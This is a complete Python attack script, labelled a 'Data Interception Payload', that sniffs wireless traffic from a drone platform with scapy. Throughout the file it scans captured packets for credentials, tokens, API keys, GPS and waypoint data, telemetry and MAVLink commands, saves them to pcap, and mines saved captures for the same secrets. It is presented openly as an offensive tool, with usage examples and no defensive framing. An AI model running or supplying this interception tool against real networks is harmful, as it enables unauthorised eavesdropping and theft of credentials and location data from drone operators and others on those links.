#!/usr/bin/env python3
"""
Data Interception Payload
Intercepts wireless communications from drone platform to extract sensitive data
"""

import sys
import time
from collections import defaultdict

def check_scapy():
    """Check if scapy is available"""
    try:
        from scapy.all import sniff, IP, TCP, UDP, Raw
        return True
    except ImportError:
        return False

def intercept_wireless_communications(interface, target_network=None, duration=300, output_file=None):
    """
    Intercept wireless communications from drone platform
    
    Args:
        interface: Network interface to capture on
        target_network: Target network IP range (e.g., 192.168.13.0/24)
        duration: Capture duration in seconds
        output_file: File to save intercepted data
    """
    scapy_available = check_scapy()
    
    if not scapy_available:
        print("[-] scapy not available")
        print("[!] Install with: pip install scapy")
        return
    
    from scapy.all import sniff, IP, TCP, UDP, Raw, wrpcap
    
    # Build filter expression
    if target_network:
        filter_expr = f"net {target_network}"
    else:
        filter_expr = None  # Capture all traffic
    
    print(f"[*] Starting wireless communication interception...")
    print(f"[*] Interface: {interface}")
    print(f"[*] Duration: {duration} seconds")
    if target_network:
        print(f"[*] Target network: {target_network}")
    print()
    
    captured_packets = []
    intercepted_data = defaultdict(list)
    sensitive_patterns = [
        b'password', b'username', b'login', b'credential',
        b'api_key', b'token', b'secret', b'private',
        b'gps', b'location', b'waypoint', b'mission',
        b'telemetry', b'video', b'camera'
    ]
    
    def process_packet(packet):
        """Process intercepted packet"""
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            protocol = None
            data = None
            
            if TCP in packet:
                protocol = 'TCP'
                if Raw in packet:
                    data = packet[Raw].load
            elif UDP in packet:
                protocol = 'UDP'
                if Raw in packet:
                    data = packet[Raw].load
            
            if data:
                # Check for sensitive patterns
                data_lower = data.lower()
                for pattern in sensitive_patterns:
                    if pattern in data_lower:
                        intercepted_data[pattern.decode()].append({
                            'src': src_ip,
                            'dst': dst_ip,
                            'protocol': protocol,
                            'data': data[:200],  # First 200 bytes
                            'time': time.time()
                        })
                        print(f"[!] Sensitive data detected ({pattern.decode()}): {src_ip} -> {dst_ip}")
                        try:
                            preview = data[:100].decode('utf-8', errors='ignore')
                            print(f"    Preview: {preview[:80]}...")
                        except:
                            pass
            
            captured_packets.append(packet)
            if len(captured_packets) % 1000 == 0:
                print(f"[*] Intercepted {len(captured_packets)} packets...")
    
    # Start interception
    try:
        packets = sniff(iface=interface, filter=filter_expr, timeout=duration, prn=process_packet)
        print(f"\n[+] Interception complete: {len(packets)} packets captured")
    except Exception as e:
        print(f"[-] Error during interception: {e}")
        return
    
    # Save to file if specified
    if output_file:
        try:
            wrpcap(output_file, captured_packets)
            print(f"[+] Packets saved to {output_file}")
        except Exception as e:
            print(f"[-] Error saving packets: {e}")
    
    # Summary
    print("\n" + "="*50)
    print("DATA INTERCEPTION SUMMARY")
    print("="*50)
    print(f"Total packets intercepted: {len(captured_packets)}")
    print(f"Sensitive data patterns found: {len(intercepted_data)}")
    
    for pattern, entries in intercepted_data.items():
        print(f"\n[{pattern.upper()}]: {len(entries)} occurrences")
        for entry in entries[:5]:  # Show first 5
            print(f"  {entry['src']} -> {entry['dst']} ({entry['protocol']})")

def extract_sensitive_data(packet_file):
    """
    Extract sensitive data from captured packets
    
    Args:
        packet_file: Path to pcap file
    """
    scapy_available = check_scapy()
    
    if not scapy_available:
        print("[-] scapy not available")
        return
    
    from scapy.all import rdpcap, IP, TCP, UDP, Raw
    
    print(f"[*] Analyzing packets in {packet_file}...")
    
    try:
        packets = rdpcap(packet_file)
        print(f"[+] Loaded {len(packets)} packets")
        
        sensitive_data = {
            'credentials': [],
            'locations': [],
            'commands': [],
            'other': []
        }
        
        for packet in packets:
            if IP in packet and (TCP in packet or UDP in packet) and Raw in packet:
                try:
                    data = packet[Raw].load
                    data_str = data.decode('utf-8', errors='ignore')
                    
                    # Extract credentials
                    if 'password' in data_str.lower() or 'username' in data_str.lower():
                        sensitive_data['credentials'].append(data_str[:500])
                    
                    # Extract GPS/location data
                    if 'gps' in data_str.lower() or 'lat' in data_str.lower() or 'lon' in data_str.lower():
                        sensitive_data['locations'].append(data_str[:500])
                    
                    # Extract commands
                    if 'command' in data_str.lower() or 'mavlink' in data_str.lower():
                        sensitive_data['commands'].append(data_str[:500])
                    
                except:
                    pass
        
        # Print summary
        print("\n" + "="*50)
        print("EXTRACTED SENSITIVE DATA")
        print("="*50)
        for category, items in sensitive_data.items():
            if items:
                print(f"\n[{category.upper()}]: {len(items)} items")
                for item in items[:3]:  # Show first 3
                    print(f"  {item[:100]}...")
        
    except Exception as e:
        print(f"[-] Error analyzing packets: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 data_interception.py <interface> [options...]")
        print("\nArguments:")
        print("  interface    Network interface (e.g., wlan0mon)")
        print("\nOptions:")
        print("  --network <net>      Target network (e.g., 192.168.13.0/24)")
        print("  --duration <sec>     Capture duration (default: 300)")
        print("  --output <file>      Output pcap file")
        print("  --extract <file>     Extract data from pcap file")
        print("\nExamples:")
        print("  python3 data_interception.py wlan0mon")
        print("  python3 data_interception.py wlan0mon --network 192.168.13.0/24 --duration 600")
        print("  python3 data_interception.py wlan0mon --extract captured.pcap")
        sys.exit(1)
    
    interface = sys.argv[1]
    
    # Parse options
    target_network = None
    duration = 300
    output_file = None
    extract_file = None
    
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--network' and i + 1 < len(sys.argv):
            target_network = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--duration' and i + 1 < len(sys.argv):
            try:
                duration = int(sys.argv[i + 1])
                if duration < 1:
                    raise ValueError("Duration must be at least 1 second")
                if duration > 3600:
                    print("[!] Warning: Duration exceeds 1 hour")
            except (ValueError, TypeError) as e:
                print(f"[-] Invalid duration: {e}")
                sys.exit(1)
            i += 2
        elif sys.argv[i] == '--output' and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
            # Validate output file path
            from pathlib import Path
            output_path = Path(output_file)
            try:
                output_path.parent.mkdir(parents=True, exist_ok=True)
                test_file = output_path.parent / ".write_test"
                test_file.touch()
                test_file.unlink()
            except (OSError, PermissionError) as e:
                print(f"[-] Cannot write to output file '{output_file}': {e}")
                sys.exit(1)
            i += 2
        elif sys.argv[i] == '--extract' and i + 1 < len(sys.argv):
            extract_file = sys.argv[i + 1]
            # Validate extract file exists
            from pathlib import Path
            extract_path = Path(extract_file)
            if not extract_path.exists():
                print(f"[-] File not found: {extract_file}")
                sys.exit(1)
            if not extract_path.is_file():
                print(f"[-] Path is not a file: {extract_file}")
                sys.exit(1)
            i += 2
        else:
            i += 1
    
    # Perform action
    if extract_file:
        extract_sensitive_data(extract_file)
    else:
        intercept_wireless_communications(interface, target_network, duration, output_file)

if __name__ == "__main__":
    main()
